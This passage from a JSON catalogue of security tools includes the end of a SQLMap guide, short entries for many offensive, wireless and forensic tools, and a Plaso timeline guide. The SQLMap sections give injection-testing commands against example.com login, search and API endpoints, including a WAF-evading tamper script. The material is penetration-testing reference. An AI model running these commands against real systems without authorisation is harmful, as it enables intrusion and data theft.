note**  \nDBMS exploitation may modify data — take DB snapshots where possible.\n\n---\n\n## 15. Common Testing Scenarios (Login, Search, APIs)\n\n**What it is / Why it matters**  \nExamples reflect real world vectors: login forms, search inputs, REST APIs. They help testers apply SQLMap safely.\n\n**Step-by-step commands**  \n```bash\nLogin form (POST)\npython3 sqlmap.py -u \"http://example.com/login.php\" --data=\"username=admin&password=pass\" --level=3 --risk=2\n\nSearch parameter\npython3 sqlmap.py -u \"http://example.com/search.php?q=test\" -p q --technique=BEUST\n\nAPI endpoint with JSON body (use Burp saved request)\npython3 sqlmap.py -r request.txt --batch\n```\n\n**What to expect**  \nSQLMap identifies injectable parameters and recommends next steps (enumeration/dump).\n\n**Troubleshooting & tips**  \nFor JSON APIs, prefer `-r` saved request. Test with safe `--batch` flags in non-destructive modes first.\n\n**Safety / ethics note**  \nAPIs often handle sensitive data; minimize exposure and follow disclosure protocols.\n\n---\n\n## 16. Pro Tips & Best Practices\n\n**What it is / Why it matters**  \nGuidance to make testing efficient, safe, and defensible.\n\n**Step-by-step commands**  \n```bash\nRecommended starter\npython3 sqlmap.py -u \"URL\" --level=1 --risk=1 -v 2\n\nIf WAF present, test tamper scripts via proxy\npython3 sqlmap.py -u \"URL\" --tamper=space2comment --proxy=\"http://127.0.0.1:8080\"\n```\n\n**What to expect**  \nSafer initial scans, clearer logs, and repeatable testing steps.\n\n**Troubleshooting & tips**  \nDocument everything, store outputs securely, and use `--threads` conservatively.\n\n**Safety / ethics note**  \nObtain written authorization, follow responsible disclosure, and never exfiltrate data unnecessarily.\n\n---\n\n## 17. Legal Disclaimer\n\n**What it is / Why it matters**  \nLegal and ethical constraints around using SQLMap.\n\n**Step-by-step commands**  \nN/A — read and follow organizational policies.\n\n**What to expect**  \nCompliance requirements and potential legal consequences for unauthorized testing.\n\n**Troubleshooting & tips**  \nWhen in doubt, pause and obtain written authorization.\n\n**Safety / ethics note**  \nUnauthorized use may violate laws and lead to criminal charges. Always act ethically.\n\n---\n\n**End of file**  \n"
      }
    ]
  },
  {
    "name": "Arachni",
    "description": "A feature-full, modular, high-performance Ruby framework for web app scanning.",
    "category": "Web Application Security",
    "tags": [
      "vulnerability scanner",
      "ruby",
      "web"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Wfuzz",
    "description": "A web application fuzzer.",
    "category": "Web Application Security",
    "tags": [
      "fuzzing",
      "bruteforce",
      "web discovery"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Dirb",
    "description": "A Web Content Scanner that looks for existing (and/or hidden) Web Objects.",
    "category": "Web Application Security",
    "tags": [
      "directory bruteforce",
      "web discovery",
      "cli"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Dirbuster",
    "description": "A multi-threaded java application designed to brute force directories and files names on web/application servers.",
    "category": "Web Application Security",
    "tags": [
      "directory bruteforce",
      "gui",
      "owasp"
    ],
    "color": "#4be575"
  },
  {
    "name": "Gobuster",
    "description": "A tool used to brute-force URIs (directories and files) in web sites.",
    "category": "Web Application Security",
    "tags": [
      "directory bruteforce",
      "dns subdomain",
      "go"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "WhatWeb",
    "description": "A next generation web scanner that identifies technologies used on websites.",
    "category": "Web Application Security",
    "tags": [
      "fingerprinting",
      "cms detection",
      "javascript libraries"
    ],
    "color": "#9be54b"
  },
  {
    "name": "WPScan",
    "description": "A black box WordPress security scanner.",
    "category": "Web Application Security",
    "tags": [
      "wordpress",
      "cms scanner",
      "vulnerability"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "JoomScan",
    "description": "A tool to detect Joomla CMS vulnerabilities.",
    "category": "Web Application Security",
    "tags": [
      "joomla",
      "cms scanner",
      "vulnerability"
    ],
    "color": "#e54b75"
  },
  {
    "name": "FFUF",
    "description": "Fuzz Faster U Fool: A fast web fuzzer written in Go.",
    "category": "Web Application Security",
    "tags": [
      "fuzzing",
      "web discovery",
      "go"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Sublist3r",
    "description": "A fast subdomains enumeration tool for penetration testers.",
    "category": "Web Application Security",
    "tags": [
      "subdomain enumeration",
      "osint",
      "python"
    ],
    "color": "#4be575"
  },
  {
    "name": "Amass",
    "description": "In-depth Attack Surface Mapping and Asset Discovery.",
    "category": "Web Application Security",
    "tags": [
      "subdomain enumeration",
      "osint",
      "attack surface"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Nuclei",
    "description": "Fast and customizable vulnerability scanner based on simple YAML based templates.",
    "category": "Web Application Security",
    "tags": [
      "vulnerability scanner",
      "templates",
      "fast"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Commix",
    "description": "Automated All-in-One OS Command Injection and Exploitation Tool.",
    "category": "Web Application Security",
    "tags": [
      "command injection",
      "exploitation",
      "python"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "XSSer",
    "description": "An automatic -framework- to detect, exploit and report XSS vulnerabilities.",
    "category": "Web Application Security",
    "tags": [
      "xss",
      "cross site scripting",
      "exploitation"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "BeEF",
    "description": "The Browser Exploitation Framework.",
    "category": "Web Application Security",
    "tags": [
      "xss",
      "browser hooking",
      "client side"
    ],
    "color": "#56e54b"
  },
  {
    "name": "NoSQLMap",
    "description": "A tool to audit for and automate injection attacks on NoSQL databases.",
    "category": "Web Application Security",
    "tags": [
      "nosql injection",
      "database",
      "mongodb"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "XSStrike",
    "description": "Advanced XSS scanner with four handwritten parsers, an intelligent payload generator, and a powerful fuzzing engine.",
    "category": "Web Application Security",
    "tags": [
      "xss",
      "fuzzer",
      "scanner"
    ],
    "color": "#a04be5"
  },
  {
    "name": "John the Ripper",
    "description": "A fast password cracker.",
    "category": "Password Attacks",
    "tags": [
      "password cracking",
      "hash cracking",
      "dictionary attack"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "Hashcat",
    "description": "The world's fastest and most advanced password recovery utility.",
    "category": "Password Attacks",
    "tags": [
      "gpu password cracking",
      "hash cracking",
      "brute-force"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "Hydra",
    "description": "A very fast network logon cracker which supports many different services.",
    "category": "Password Attacks",
    "tags": [
      "brute-force",
      "dictionary attack",
      "login cracker"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "Medusa",
    "description": "A speedy, parallel, and modular, login brute-forcer.",
    "category": "Password Attacks",
    "tags": [
      "brute-force",
      "login cracker",
      "parallel"
    ],
    "color": "#75e54b"
  },
  {
    "name": "Cain & Abel",
    "description": "A password recovery tool for Microsoft Operating Systems.",
    "category": "Password Attacks",
    "tags": [
      "windows",
      "password recovery",
      "sniffer"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "Ophcrack",
    "description": "A free Windows password cracker based on rainbow tables.",
    "category": "Password Attacks",
    "tags": [
      "windows",
      "rainbow tables",
      "lm hashes"
    ],
    "color": "#c34be5"
  },
  {
    "name": "RainbowCrack",
    "description": "A general purpose rainbow table based hash cracker.",
    "category": "Password Attacks",
    "tags": [
      "rainbow tables",
      "hash cracking"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "WCE",
    "description": "Windows Credentials Editor, a security tool to list logon sessions.",
    "category": "Password Attacks",
    "tags": [
      "windows",
      "credential dumping",
      "lsa secrets"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "fgdump",
    "description": "An old executable that extracts NTLM and LanMan password hashes.",
    "category": "Password Attacks",
    "tags": [
      "windows",
      "hash dumping",
      "sam"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Pwdump",
    "description": "A program that can dump password hashes from the SAM database.",
    "category": "Password Attacks",
    "tags": [
      "windows",
      "hash dumping",
      "sam"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "CeWL",
    "description": "A custom word list generator.",
    "category": "Password Attacks",
    "tags": [
      "wordlist generator",
      "web scraping",
      "password profiling"
    ],
    "color": "#4be575"
  },
  {
    "name": "crunch",
    "description": "A wordlist generator where you can specify a standard character set or a character set you specify.",
    "category": "Password Attacks",
    "tags": [
      "wordlist generator",
      "brute-force"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Ncrack",
    "description": "A high-speed network authentication cracking tool.",
    "category": "Password Attacks",
    "tags": [
      "network login",
      "brute-force",
      "nmap"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Patator",
    "description": "A multi-purpose brute-forcer, with a modular design.",
    "category": "Password Attacks",
    "tags": [
      "brute-force",
      "multi-protocol",
      "python"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Crowbar",
    "description": "A brute-forcing tool that can be used during penetration tests.",
    "category": "Password Attacks",
    "tags": [
      "rdp",
      "vnc",
      "ssh keys"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "SAMInside",
    "description": "A program for recovering user passwords of Windows NT/2000/XP/2003/Vista/7.",
    "category": "Password Attacks",
    "tags": [
      "windows",
      "password recovery",
      "offline attack"
    ],
    "color": "#4be575"
  },
  {
    "name": "L0phtCrack",
    "description": "A password auditing and recovery application.",
    "category": "Password Attacks",
    "tags": [
      "windows",
      "password audit",
      "hash cracking"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "DaveGrohl",
    "description": "A brute-force tool for OS X.",
    "category": "Password Attacks",
    "tags": [
      "osx",
      "brute-force",
      "dictionary attack"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Brutus",
    "description": "One of the oldest, fastest, and most popular online password crackers.",
    "category": "Password Attacks",
    "tags": [
      "brute-force",
      "network login",
      "windows"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "LaZagne",
    "description": "An open source password recovery project.",
    "category": "Password Attacks",
    "tags": [
      "password recovery",
      "credentials",
      "post-exploitation"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Aircrack-ng",
    "description": "A complete suite of tools to assess Wi-Fi network security.",
    "category": "Wireless Hacking",
    "tags": [
      "wifi",
      "wep",
      "wpa/wpa2-psk",
      "cracking"
    ],
    "color": "#56e54b"
  },
  {
    "name": "Reaver",
    "description": "A tool that brute forces WPS PINs.",
    "category": "Wireless Hacking",
    "tags": [
      "wps",
      "brute-force",
      "wifi"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "PixieWPS",
    "description": "A tool used to bruteforce WPS pins in offline mode.",
    "category": "Wireless Hacking",
    "tags": [
      "wps",
      "offline attack",
      "wifi"
    ],
    "color": "#a04be5"
  },
  {
    "name": "Wifite",
    "description": "An automated wireless attack tool.",
    "category": "Wireless Hacking",
    "tags": [
      "automated",
      "wifi cracking",
      "wps",
      "wep"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "Fern Wifi Cracker",
    "description": "A Wireless security auditing and attack software program.",
    "category": "Wireless Hacking",
    "tags": [
      "gui",
      "wifi cracking",
      "wep",
      "wpa"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "Wi-Fi Pumpkin",
    "description": "A framework for creating rogue Wi-Fi access points.",
    "category": "Wireless Hacking",
    "tags": [
      "rogue ap",
      "mitm",
      "phishing"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "Fluxion",
    "description": "A social engineering wireless auditing tool.",
    "category": "Wireless Hacking",
    "tags": [
      "phishing",
      "rogue ap",
      "wpa"
    ],
    "color": "#75e54b"
  },
  {
    "name": "MDK3",
    "description": "A Wi-Fi testing tool that exploits common 802.11 protocol weaknesses.",
    "category": "Wireless Hacking",
    "tags": [
      "dos",
      "wifi jamming",
      "ssid flooding"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "CoWPAtty",
    "description": "An offline dictionary attack tool for WPA/WPA2.",
    "category": "Wireless Hacking",
    "tags": [
      "wpa",
      "dictionary attack",
      "offline"
    ],
    "color": "#c34be5"
  },
  {
    "name": "Airgeddon",
    "description": "A multi-use bash script for Linux systems to audit wireless networks.",
    "category": "Wireless Hacking",
    "tags": [
      "bash",
      "wifi audit",
      "all-in-one"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "KisMAC",
    "description": "A wireless stumbling and security tool for Mac OS X.",
    "category": "Wireless Hacking",
    "tags": [
      "osx",
      "wardriving",
      "wifi scanner"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "inSSIDer",
    "description": "A Wi-Fi optimization and troubleshooting tool.",
    "category": "Wireless Hacking",
    "tags": [
      "wifi scanner",
      "channel analysis",
      "troubleshooting"
    ],
    "color": "#e54b75"
  },
  {
    "name": "NetStumbler",
    "description": "A tool for Windows that facilitates detection of Wireless LANs.",
    "category": "Wireless Hacking",
    "tags": [
      "windows",
      "wardriving",
      "wifi scanner"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Ghost Phisher",
    "description": "A Wireless and Ethernet security auditing and attack software program.",
    "category": "Wireless Hacking",
    "tags": [
      "phishing",
      "fake ap",
      "session hijacking"
    ],
    "color": "#4be575"
  },
  {
    "name": "Eaphammer",
    "description": "A toolkit for performing targeted evil twin attacks against WPA2-Enterprise networks.",
    "category": "Wireless Hacking",
    "tags": [
      "wpa2-enterprise",
      "evil twin",
      "rogue ap"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Wifiphisher",
    "description": "A rogue Access Point framework for conducting phishing attacks.",
    "category": "Wireless Hacking",
    "tags": [
      "phishing",
      "rogue ap",
      "social engineering"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Pyrit",
    "description": "A powerful tool for WPA/WPA2-PSK key cracking.",
    "category": "Wireless Hacking",
    "tags": [
      "wpa cracking",
      "gpu",
      "pre-computation"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "FakeAP",
    "description": "A script that creates a fake 802.11b access point.",
    "category": "Wireless Hacking",
    "tags": [
      "fake ap",
      "honeypot",
      "mitm"
    ],
    "color": "#e54b75"
  },
  {
    "name": "airmon-ng",
    "description": "Part of aircrack-ng, used to enable monitor mode on wireless interfaces.",
    "category": "Wireless Hacking",
    "tags": [
      "monitor mode",
      "wifi",
      "packet capture"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "airodump-ng",
    "description": "Part of aircrack-ng, used for packet capturing of raw 802.11 frames.",
    "category": "Wireless Hacking",
    "tags": [
      "packet capture",
      "wifi scanner",
      "bssid"
    ],
    "color": "#4be575"
  },
  {
    "name": "Metasploit",
    "description": "A penetration testing platform that enables you to find, exploit, and validate vulnerabilities.",
    "category": "Exploitation Frameworks",
    "tags": [
      "exploit development",
      "payload generation",
      "post-exploitation"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Mimikatz",
    "description": "A tool to extract plain text passwords, hash, PIN code and kerberos tickets from memory.",
    "category": "Exploitation Frameworks",
    "tags": [
      "credential dumping",
      "pass-the-hash",
      "golden ticket"
    ],
    "color": "#9be54b"
  },
  {
    "name": "PowerSploit",
    "description": "A collection of PowerShell modules for penetration testing.",
    "category": "Exploitation Frameworks",
    "tags": [
      "powershell",
      "post-exploitation",
      "windows"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "Empire",
    "description": "A post-exploitation framework that includes a pure-PowerShell2.0 Windows agent.",
    "category": "Exploitation Frameworks",
    "tags": [
      "post-exploitation",
      "c2",
      "powershell"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Cobalt Strike",
    "description": "A commercial threat emulation software for adversary simulations.",
    "category": "Exploitation Frameworks",
    "tags": [
      "c2",
      "red team",
      "adversary simulation"
    ],
    "color": "#56e54b"
  },
  {
    "name": "Canvas",
    "description": "A commercial penetration testing tool with hundreds of exploits.",
    "category": "Exploitation Frameworks",
    "tags": [
      "exploit framework",
      "vulnerability assessment"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "Core Impact",
    "description": "An automated penetration testing tool.",
    "category": "Exploitation Frameworks",
    "tags": [
      "automated pentesting",
      "exploitation"
    ],
    "color": "#a04be5"
  },
  {
    "name": "SET",
    "description": "The Social-Engineer Toolkit, designed for social engineering attacks.",
    "category": "Exploitation Frameworks",
    "tags": [
      "social engineering",
      "phishing",
      "payload generation"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "Veil Framework",
    "description": "A tool designed to generate metasploit payloads that bypass common anti-virus solutions.",
    "category": "Exploitation Frameworks",
    "tags": [
      "av evasion",
      "payload generation",
      "metasploit"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "Shellter",
    "description": "A dynamic shellcode injection tool.",
    "category": "Exploitation Frameworks",
    "tags": [
      "av evasion",
      "shellcode",
      "pe infection"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "msfvenom",
    "description": "A standalone payload generator from Metasploit.",
    "category": "Exploitation Frameworks",
    "tags": [
      "payload generation",
      "shellcode",
      "encoders"
    ],
    "color": "#75e54b"
  },
  {
    "name": "Armitage",
    "description": "A graphical cyber attack management tool for Metasploit.",
    "category": "Exploitation Frameworks",
    "tags": [
      "metasploit gui",
      "visualization",
      "red team"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "Routersploit",
    "description": "An open-source exploitation framework for embedded devices.",
    "category": "Exploitation Frameworks",
    "tags": [
      "router",
      "iot",
      "embedded devices"
    ],
    "color": "#c34be5"
  },
  {
    "name": "CrackMapExec",
    "description": "A post-exploitation tool that helps automate assessing the security of large Active Directory networks.",
    "category": "Exploitation Frameworks",
    "tags": [
      "active directory",
      "post-exploitation",
      "smb"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "Impacket",
    "description": "A collection of Python classes for working with network protocols.",
    "category": "Exploitation Frameworks",
    "tags": [
      "python",
      "network protocols",
      "active directory"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Pupy",
    "description": "An open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool.",
    "category": "Exploitation Frameworks",
    "tags": [
      "rat",
      "c2",
      "cross-platform"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Nishang",
    "description": "A framework and collection of scripts and payloads which enables usage of PowerShell for penetration testing.",
    "category": "Exploitation Frameworks",
    "tags": [
      "powershell",
      "post-exploitation",
      "scripts"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Scythe",
    "description": "A commercial command-and-control (C2) platform for red and purple teams.",
    "category": "Exploitation Frameworks",
    "tags": [
      "c2",
      "red team",
      "adversary emulation"
    ],
    "color": "#4be575"
  },
  {
    "name": "Covenant",
    "description": "A .NET command and control framework that aims to highlight the attack surface of .NET.",
    "category": "Exploitation Frameworks",
    "tags": [
      ".net",
      "c2",
      "post-exploitation"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Koadic",
    "description": "A Windows post-exploitation rootkit that uses VBScript and JScript.",
    "category": "Exploitation Frameworks",
    "tags": [
      "c2",
      "post-exploitation",
      "windows",
      "jscript"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Volatility",
    "description": "An open-source memory forensics framework.",
    "category": "Forensics",
    "tags": [
      "memory analysis",
      "malware analysis",
      "incident response"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Autopsy",
    "description": "A digital forensics platform and graphical interface to The Sleuth Kit.",
    "category": "Forensics",
    "tags": [
      "disk analysis",
      "file system analysis",
      "timeline analysis"
    ],
    "color": "#e54b75"
  },
  {
    "name": "The Sleuth Kit",
    "description": "A library and collection of command line tools for forensic analysis of disk images.",
    "category": "Forensics",
    "tags": [
      "disk forensics",
      "file system",
      "cli"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "EnCase",
    "description": "A commercial digital forensics platform.",
    "category": "Forensics",
    "tags": [
      "disk imaging",
      "forensic analysis",
      "commercial"
    ],
    "color": "#4be575"
  },
  {
    "name": "FTK Imager",
    "description": "A data preview and imaging tool that lets you quickly assess electronic evidence.",
    "category": "Forensics",
    "tags": [
      "disk imaging",
      "triage",
      "evidence preview"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "SIFT Workstation",
    "description": "SANS Investigative Forensic Toolkit, a collection of free and open-source incident response and forensic tools.",
    "category": "Forensics",
    "tags": [
      "forensics distro",
      "incident response",
      "sans"
    ],
    "color": "#9be54b"
  },
  {
    "name": "DEFT Linux",
    "description": "Digital Evidence & Forensics Toolkit, a Linux distribution for forensics.",
    "category": "Forensics",
    "tags": [
      "forensics distro",
      "live cd",
      "incident response"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "CAINE",
    "description": "Computer Aided INvestigative Environment, an Italian GNU/Linux live distribution for digital forensics.",
    "category": "Forensics",
    "tags": [
      "forensics distro",
      "live cd",
      "investigation"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Redline",
    "description": "A free endpoint security tool that provides host investigative capabilities.",
    "category": "Forensics",
    "tags": [
      "memory analysis",
      "ioc",
      "endpoint forensics"
    ],
    "color": "#56e54b"
  },
  {
    "name": "Bulk Extractor",
    "description": "A tool that scans a disk image, a file, or a directory of files and extracts useful information.",
    "category": "Forensics",
    "tags": [
      "data carving",
      "disk analysis",
      "feature extraction"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "X-Ways Forensics",
    "description": "An advanced work environment for computer forensic examiners.",
    "category": "Forensics",
    "tags": [
      "disk analysis",
      "file recovery",
      "commercial"
    ],
    "color": "#a04be5"
  },
  {
    "name": "Registry Recon",
    "description": "A tool for extracting and analyzing Windows registry data.",
    "category": "Forensics",
    "tags": [
      "windows registry",
      "forensics",
      "artifact analysis"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "F-Response",
    "description": "Provides read-only access to remote disks, memory, and RAID.",
    "category": "Forensics",
    "tags": [
      "remote forensics",
      "live analysis",
      "incident response"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "Log2timeline/Plaso",
    "description": "A framework for generating super timelines from various log files and artifacts.",
    "category": "Forensics",
    "tags": [
      "timeline analysis",
      "log analysis",
      "super timeline"
    ],
    "color": "#e54ba0",
    "articles": [
      {
        "title": "🕒 Plaso (log2timeline) — Complete Forensics Timeline Analysis Guide",
        "content": "# 🕒 Plaso (log2timeline) — Complete Forensics Timeline Analysis Guide\n\n## 1️⃣ What is Plaso?\nPlaso (**Plaso Langar Að Safna Öllu**) is a Python-based engine used for automatic creation of **super timelines**. It extracts timestamps from multiple file formats and system artifacts, making it invaluable for **digital forensics, incident response, and timeline reconstruction**.\n\nPlaso allows investigators to reconstruct **who did what, and when**, during a security event.\n\n---\n\n## 2️⃣ Installation & Setup\n\n### 🐧 Ubuntu / Debian\n```bash\nsudo add-apt-repository ppa:gift/stable\nsudo apt update\nsudo apt install plaso-tools\nlog2timeline.py --version\npsort.py --version\n```\n\n### 🧱 CentOS / RHEL / Fedora\n```bash\nsudo yum install epel-release\nsudo yum install python3-pip python3-devel\nsudo pip3 install plaso\nlog2timeline.py --version\n```\n\n### 🪟 Windows\n```bash\nDownload from: https://github.com/log2timeline/plaso/releases\nlog2timeline.py --version\npsort.py --version\n```\n\n### 🍎 macOS\n```bash\npip3 install plaso\nor\nbrew install plaso\nlog2timeline.py --version\n```\n\n---\n\n## 3️⃣ Basic Usage\n\n### Create a Timeline\n```bash\nlog2timeline.py timeline.plaso /path/to/evidence\npsort.py -o l2tcsv -w timeline.csv timeline.plaso\n```\n\n### Examples\n```bash\nlog2timeline.py timeline.plaso disk_image.dd\nlog2timeline.py timeline.plaso /path/to/dir/\nlog2timeline.py timeline.plaso file1.log file2.evtx\nlog2timeline.py --workers 4 timeline.plaso disk_image.dd\n```\n\n---\n\n## 4️⃣ Timeline Output Formats\n```bash\npsort.py -o l2tcsv -w timeline.csv timeline.plaso\npsort.py -o json -w timeline.json timeline.plaso\npsort.py -o sqlite -w timeline.db timeline.plaso\npsort.py -o elastic -w timeline timeline.plaso\n```\n\n---\n\n## 5️⃣ Advanced Timeline Analysis\n\n### Filter Examples\n```bash\npsort.py -o l2tcsv -w filtered.csv --date-filter \"2023-06-01,2023-06-30\" timeline.plaso\npsort.py -o l2tcsv -w filtered.csv --parsers \"winevtx,prefetch,mft\" timeline.plaso\npsort.py -o l2tcsv -w filtered.csv --slice \"malware\" timeline.plaso\n```\n\n### Parser Management\n```bash\nlog2timeline.py --parsers list\nlog2timeline.py --parsers \"winevtx,prefetch,mft\" timeline.plaso disk_image.dd\nlog2timeline.py --parsers \"!syslog,!apache\" timeline.plaso disk_image.dd\n```\n\n---\n\n## 6️⃣ Performance Optimization\n```bash\nlog2timeline.py --workers 8 timeline.plaso disk_image.dd\nlog2timeline.py --buffer-size 196608 timeline.plaso disk_image.dd\nlog2timeline.py --temporary-directory /tmp/plaso timeline.plaso disk_image.dd\n```\n\n---\n\n## 7️⃣ Forensic Investigation Workflows\n\n### 🪟 Windows Analysis\n```bash\nlog2timeline.py --parsers \"winevtx,winreg,prefetch,mft,lnk,pe,olecf\" --workers 4 windows_timeline.plaso windows_image.dd\npsort.py -o l2tcsv -w windows_timeline.csv windows_timeline.plaso\n```\n\n### 🐧 Linux Analysis\n```bash\nlog2timeline.py --parsers \"syslog,utmp,bash_history,sqlite\" --workers 4 linux_timeline.plaso linux_image.dd\npsort.py -o l2tcsv -w linux_timeline.csv linux_timeline.plaso\n```\n\n---\n\n## 8️⃣ Timeline Analysis Techniques\n\n### Event Correlation\n```bash\npsort.py -o l2tcsv -w detailed_timeline.csv --additional-fields \"inode,username,hostname\" timeline.plaso\n```\n\n### Anomaly Detection\n```bash\npsort.py -o l2tcsv -w after_hours.csv --date-filter \"*T22:00:00,*T06:00:00\" timeline.plaso\npsort.py -o l2tcsv -w weekend_activity.csv --date-filter \"2023-06-17,2023-06-18\" timeline.plaso\n```\n\n---\n\n## 9️⃣ Automation Scripts\n\n### Bash Batch Script\n```bash\n!/bin/bash\nEVIDENCE_DIR=\"$1\"\nOUTPUT_DIR=\"$2\"\nCASE_NAME=\"$3\"\nlog2timeline.py --workers 4 \"$OUTPUT_DIR/${CASE_NAME}.plaso\" \"$EVIDENCE_DIR\"\npsort.py -o l2tcsv -w \"$OUTPUT_DIR/${CASE_NAME}.csv\" \"$OUTPUT_DIR/${CASE_NAME}.plaso\"\n```\n\n### Python Script Integration\n```python\nimport subprocess\nsubprocess.run([\"log2timeline.py\", \"timeline.plaso\", \"/evidence/path\"])\nsubprocess.run([\"psort.py\", \"-o\", \"l2tcsv\", \"-w\", \"timeline.csv\", \"timeline.plaso\"])\n```\n\n---\n\n## 🔟 Integration with Other Tools\n\n### 🧠 Volatility\n```bash\nvol -f memory.dmp --profile=Win7SP1x64 timeliner --output-file=volatility_timeline.body\nlog2timeline.py combined_timeline.plaso disk_image.dd\n```\n\n### 🧰 Autopsy\n```bash\nlog2timeline.py autopsy_timeline.plaso /path/to/autopsy/case/\npsort.py -o l2tcsv -w plaso_timeline.csv autopsy_timeline.plaso\n```\n\n### 📊 ELK Stack\n```bash\npsort.py -o elastic --server localhost --port 9200 --index-name forensic_timeline timeline.plaso\n```\n\n---\n\n## 1️⃣1️⃣ Troubleshooting\n\n### Common Problems\n```bash\nlog2timeline.py --buffer-size 65536 timeline.plaso large_image.dd\nlog2timeline.py --no-vss timeline.plaso corrupted_image.dd\nlog2timeline.py --parsers \"!sqlite,!chrome\" timeline.plaso image.dd\n```\n\n### Performance\n```bash\nlog2timeline.py --workers $(nproc) timeline.plaso image.dd\nlog2timeline.py --temporary-directory /tmp/ramdisk timeline.plaso image.dd\n```\n\n---\n\n## 1️⃣2️⃣ Use Cases\n\n### Digital Forensics\n- Criminal investigation timelines  \n- User activity reconstruction  \n- File access and modification history\n\n### Incident Response\n- Malware execution tracking  \n- Privilege escalation timeline  \n- Persistence analysis\n\n### Compliance & Auditing\n- Access audits  \n- Data exfiltration timeline  \n- Insider threat tracking\n\n---\n\n## 1️⃣3️⃣ Pro Tips & Best Practices\n✅ Use targeted parsers only (`--parsers`)  \n✅ Always verify time zones (`--output-time-zone UTC`)  \n✅ Combine multiple sources (memory + disk)  \n✅ Regularly update Plaso (`pip3 install -U plaso`)  \n✅ Visualize with Kibana or Timesketch  \n\n---\n\n## ⚖️ Legal Disclaimer\nPlaso must be used **only on systems you own or have permission to analyze**. Unauthorized forensic analysis can violate privacy or computer misuse laws. Always maintain chain of custody and follow organizational and legal policies.\n"
      }
    ]
  },
  {
    "name": "Network Miner",
    "description": "A Network Forensic Analysis Tool (NFAT) for Windows.",
    "category": "Forensics",
    "tags": [
      "pcap analysis",
      "network forensics",
      "file extraction"
    ],
    "color": "#75e54b"
  },
  {
    "name": "Guymager",
    "description": "A free forensic imager for media acquisition.",
    "category": "Forensics",
    "tags": [
      "disk imaging",
      "forensic acquisition",
      "gui"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "Magnet AXIOM",
    "description": "A complete digital investigation platform.",
    "category": "Forensics",
    "tags": [
      "forensics",
      "incident response",
      "commercial"
    ],
    "color": "#c34be5"
  },
  {
    "name": "ExifTool",
    "description": "A platform-independent Perl library plus a command-line application for reading, writing and editing meta information in a wide variety of files.",
    "category": "Forensics",
    "tags": [
      "metadata",
      "exif",
      "file analysis"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "Scalpel",
    "description": "A fast file carver that reads a database of header and footer definitions.",
    "category": "Forensics",
    "tags": [
      "file carving",
      "data recovery",
      "forensics"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Cellebrite UFED",
    "description": "A commercial tool for mobile device forensics.",
    "category": "Forensics",
    "tags": [
      "mobile forensics",
      "data extraction",
      "commercial"
    ],
    "color": "#e54b75"
  },
  {
    "name": "IDA Pro",
    "description": "A multi-processor disassembler and debugger.",
    "category": "Reverse Engineering",
    "tags": [
      "disassembler",
      "debugger",
      "static analysis"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Ghidra",
    "description": "A software reverse engineering (SRE) framework developed by the NSA.",
    "category": "Reverse Engineering",
    "tags": [
      "disassembler",
      "decompiler",
      "sre",
      "free"
    ],
    "color": "#4be575"
  },
  {
    "name": "Radare2",
    "description": "A framework for reverse engineering and analyzing binaries.",
    "category": "Reverse Engineering",
    "tags": [
      "disassembler",
